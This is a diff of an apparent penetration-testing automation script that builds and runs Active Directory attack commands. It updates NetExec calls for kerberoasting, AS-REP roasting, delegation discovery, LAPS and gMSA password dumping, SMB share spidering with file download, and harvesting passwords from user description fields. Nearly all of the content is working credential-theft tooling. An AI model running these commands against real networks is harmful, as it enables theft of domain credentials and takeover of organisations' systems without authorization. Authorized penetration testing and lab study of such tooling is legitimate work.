@@ -1008,7 +1008,7 @@ def write_summary(t: Target, outdir: Path, started: datetime) -> None:
             cmds.append("")
         cmds.append("# Once you have ANY valid creds:")
         cmds.append(f"nxc smb {t.ip} -u USER -p PASS --shares --users --pass-pol --groups --rid-brute 10000")
-        cmds.append(f"nxc ldap {t.ip} -u USER -p PASS --kerberoasting kerb.hash --asreproast asrep2.hash --trusted-for-delegation --admin-count")
+        cmds.append(f"nxc ldap {t.ip} -u USER -p PASS --kerberoasting kerb.hash --asreproast asrep2.hash --find-delegation --admin-count")
         cmds.append(f"impacket-GetUserSPNs '{t.domain}/USER:PASS' -dc-ip {t.ip} -request -outputfile kerberoast.hash")
         cmds.append(f"bloodhound-python -u USER -p PASS -d {t.domain} -dc {t.fqdn or t.ip} -ns {t.ip} -c All --zip")
         cmds.append("")
@@ -1474,17 +1474,9 @@ def creds_mode(args) -> int:
     findings: list[str] = []
     def hit(s: str) -> None: findings.append(f"[+] {s}")
 
-    # nxc ldap with automatic LDAPS/636 fallback when the 389 bind is refused
-    # (signing-enforced / channel-binding DCs reject plaintext LDAP).
     def ldap_call(extra: list[str], outfile: Path, tag: str, timeout: int = 600):
-        rc, o = run(["nxc", "ldap", host] + nxc_auth + extra,
-                    outfile=outfile, timeout=timeout, tag=tag)
-        if re.search(r"could not connect|strongerAuthRequired|channel binding|"
-                     r"signing is required|STATUS_NOT_SUPPORTED|connection.*reset", o, re.I):
-            warn(f"{tag}: LDAP/389 refused — retrying over LDAPS/636")
-            rc, o = run(["nxc", "ldap", host, "--port", "636"] + nxc_auth + extra,
-                        outfile=outfile, timeout=timeout, tag=tag + "-ldaps")
-        return rc, o
+        return run(["nxc", "ldap", host] + nxc_auth + extra,
+                   outfile=outfile, timeout=timeout, tag=tag, prune_on_error=True)
 
     # ── 0. validate the cred + check admin everywhere ───────────────────────
     is_admin = False
@@ -1533,19 +1525,14 @@ def creds_mode(args) -> int:
         run(["nxc", "smb", host] + nxc_auth + ["--pass-pol"], outfile=out / "02_pass_pol.txt", tag="passpol", prune_on_error=True)
         run(["nxc", "smb", host] + nxc_auth + ["-M", "spider_plus", "-o", "DOWNLOAD_FLAG=True"],
             outfile=out / "02_spider.txt", timeout=900, tag="spider", prune_on_error=True)
+        run(["nxc", "smb", host] + nxc_auth + ["--laps"], outfile=out / "02_laps.txt", tag="laps", prune_on_error=True)
 
-        # ── 3. authenticated LDAP (LDAPS/636 auto-fallback): roast + delegation + laps/gmsa ─
-        ldap_call(["--kerberoasting", str(out / "03_kerberoast.hash")],
-                  out / "03_kerberoast.txt", "kerberoast")
-        ldap_call(["--asreproast", str(out / "03_asrep.hash")],
-                  out / "03_asrep.txt", "asrep")
-        ldap_call(["--trusted-for-delegation"], out / "03_delegation.txt", "deleg")
+        ldap_call(["--kerberoasting", str(out / "03_kerberoast.hash")], out / "03_kerberoast.txt", "kerberoast")
+        ldap_call(["--asreproast", str(out / "03_asrep.hash")], out / "03_asrep.txt", "asrep")
+        ldap_call(["--find-delegation"], out / "03_delegation.txt", "deleg")
         ldap_call(["--admin-count"], out / "03_admincount.txt", "admincount")
         ldap_call(["--gmsa"], out / "03_gmsa.txt", "gmsa")
-        ldap_call(["-M", "laps"], out / "03_laps.txt", "laps")
-        # Descriptions field — passwords hide here
-        ldap_call(["--query", "(&(objectClass=user)(description=*))", "sAMAccountName description"],
-                  out / "03_descriptions.txt", "descriptions")
+        ldap_call(["-M", "get-desc-users"], out / "03_descriptions.txt", "descriptions")
 
     # ── 4. Kerberoast + delegation via impacket (independent of nxc path) ────
     if have("impacket-GetUserSPNs") and dom:
